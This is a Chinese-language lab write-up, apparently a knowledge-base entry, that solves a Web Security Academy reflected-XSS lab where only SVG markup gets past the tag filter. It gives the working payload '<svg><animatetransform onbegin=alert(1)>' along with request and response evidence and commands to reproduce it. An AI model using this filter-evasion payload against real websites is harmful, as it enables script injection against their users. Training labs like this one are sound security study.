---
title: "lab-some-svg-markup-allowed"
links:
  - target: xss-context-family
    relation: evidences
---

# lab-some-svg-markup-allowed

> evidences: [[xss-context-family]]

- 题面:Reflected XSS with some SVG markup allowed(/web-security/cross-site-scripting/contexts/lab-some-svg-markup-allowed)
- 实例:https://0a9500d203d1ea0f80a20d01002800c0.h1-web-security-academy.net
- 判定目标:反射 XSS 触发 `alert()`;状态:**solved**(solved_check true)

## 关键步

1. 首页搜索框 `GET /?search=X`,`X` 原样反射进 `<h1>0 search results for 'X'</h1>`(**不做 HTML 编码**)。
2. 常见标签被挡(`?search=<b>` → **400**);`<svg>` 放行(200,原样反射)。
3. 利用 SVG 事件:`?search=<svg><animatetransform onbegin=alert(1)>` → 200。
4. `lab_alert` 载入即 `fired:true, alerts:["alert:1"]`(SVG 动画开始事件在载入时触发)。

## 证据摘录

```
GET /?search=<svg>            -> 200, 反射 0 search results for '<svg>'
GET /?search=<b>              -> 400
lab_alert "…/?search=<svg><animatetransform onbegin=alert(1)>" -> {"fired":true,"alerts":["alert:1"]}
solved_check -> {"solved":true}
```

## 复现命令

```
lab_launch launch 20812D5112754AD4D73AAB3069147BF39635016F2005C5C0062A7E766FD72FFB --jar <jar>
lab_alert "https://<inst>/?search=%3Csvg%3E%3Canimatetransform%20onbegin%3Dalert(1)%3E" --settle-ms 2500
solved_check "https://<inst>/" --jar <jar>
```
